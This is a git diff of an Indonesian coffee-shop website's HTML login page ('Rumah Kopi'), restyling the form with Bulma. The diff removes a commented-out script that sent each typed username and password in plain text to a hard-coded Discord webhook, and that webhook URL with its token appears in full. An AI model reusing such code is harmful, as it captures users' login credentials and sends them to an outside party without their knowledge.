@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html>
-
 <head>
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -15,130 +14,38 @@
   <link rel="stylesheet" href="css/stylelogin.css">
 </head>
 <body>
-    <!-- Animasi Loading -->
-    <div id="loader-wrapper">
-      <div id="loader"></div>
-      <div id="loading-text"></div>
-      </div>
-  <section class="container">
-    <div class="columns is-multiline">
-      <div class="column is-8 is-offset-2 register">
-        <div class="columns">
-          <div class="column left">
-            <h1 class="title is-1">Rumah Kopi</h1>
-            <h2 class="subtitle colored is-4">Yooo Mari Merapat.</h2>
-          </div>
-          <div class="column right has-text-centered">
-            <div id="loading-overlay" class="loading-overlay">
-              <div class="loading-spinner"></div>
-              <p class="loading-text">Sedang Loading CUY!!</p>
-            </div>  
-            <h1 class="title is-4">Sign In</h1>
-        <div class="field">
-          <div class="control">
-            <input class="input is-medium" type="text" autocomplete="username"
-              id="username" placeholder="Masukan Username" required />
-          </div>
-        </div>
-        <div class="field">
-          <div class="control">
-            <input class="input is-medium" type="password" placeholder="Masukan Password"
-              autocomplete="current-password" id="password" required />
-          </div>
-        </div>
-        <br />
-        <button class="button is-block is-dark is-fullwidth is-medium" type="submit" id="button"
-          onclick="PostSignUp()">
-          Sign In
-        </button>
-        <br />
-              </form>
-              <div class="notification is-white" id="pesan"></div>
-            </div>
-          </div>
-        </div>
-          <div class="column is-8 is-offset-2">
-            <br>
-            <nav class="level">
-              <div class="level-left">
-                <div class="level-item">
-                  <span class="icon">
-                    <i class="fab fa-twitter"></i>
-                  </span> &emsp;
-                  <span class="icon">
-                    <i class="fab fa-facebook"></i>
-                  </span> &emsp;
-                  <span class="icon">
-                    <i class="fab fa-instagram"></i>
-                  </span> &emsp;
-                  <span class="icon">
-                    <i class="fab fa-github"></i>
-                  </span> &emsp;
-                  <span class="icon">
-                    <i class="fas fa-envelope"></i>
-                  </span>
+<!-- Animasi Loading -->
+<div id="loader-wrapper">
+  <div id="loader">
+</div>
+  <div id="loading-text">
+  </div>
+</div>
+<section class="hero is-success is-fullheight">
+    <div class="hero-body">
+        <div class="container has-text-centered">
+            <div class="column is-4 is-offset-4">
+                <h3 class="title has-text-black">Login</h3>
+                <hr class="login-hr">
+                <div class="box">
+                    <figure class="avatar">
+                        <img src="images/logo2.png">
+                    </figure>
+                    <form>
+                        <div class="field">
+                             <input class="input is-large" type="username" placeholder="Masukan Password" id="username">
+                        </div>
+
+                        <div class="field">
+                             <input class="input is-large" type="password" placeholder="Masukan Password" id="password">
+                        </div>
+                        <button class="button is-dark is-large is-fullwidth" type="button" id="button" onclick="Login()">Login</button>
+                    </form>
                 </div>
-              </div>
-              <div class="level-right">
-                <small class="level-item" style="color: var(--textLight)">
-                  &copy; Rumah Kopi. All Rights Reserved.
-                </small>
-              </div>
-            </nav>
-          </div>
+            </div>
         </div>
-        </div>
-  </section>
-<!-- <script>
-   //LOG DISCORD
-  const webhookURL = "https://discord.com/api/webhooks/1167176384255373395/fCtNBwIQ9zNC78K6IfOfH00XYqCj82A5GJeOrd1-2JX602Yl0lruJSL9ZzNK_3gT1SZG";
-  document.getElementById("button").addEventListener("click", () => {
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-
-    const loadingOverlay = document.getElementById("loading-overlay");
-    loadingOverlay.style.display = "flex";
-
-    const loadingText = document.querySelector(".loading-text");
-    loadingText.style.display = "block";
-
-    const message = `MENCOBA LOGIN NICHH USER: ${username} PASSWORD: ${password}`;
-    sendToDiscordWebhook(message);
-  });
-
-  function sendToDiscordWebhook(message) {
-    const requestData = {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({ content: message })
-    };
-
-    fetch(webhookURL, requestData)
-      .then(response => {
-        setTimeout(() => {
-          const loadingOverlay = document.getElementById("loading-overlay");
-          loadingOverlay.style.display = "none";
-
-          if (response.ok) {
-            console.log(" Berhasil login");
-          } else {
-            console.error(" GAGAL login");
-          }
-        }, 10000);
-      })
-      .catch(error => {
-        const loadingOverlay = document.getElementById("loading-overlay");
-        loadingOverlay.style.display = "none";
-
-        console.error("Terjadi kesalahan:", error);
-      });
-  }
-</script> -->
+    </div>
+</section>
 <script type="module" src="./js/login.js"></script>
-
-
 </body>
-
 </html>
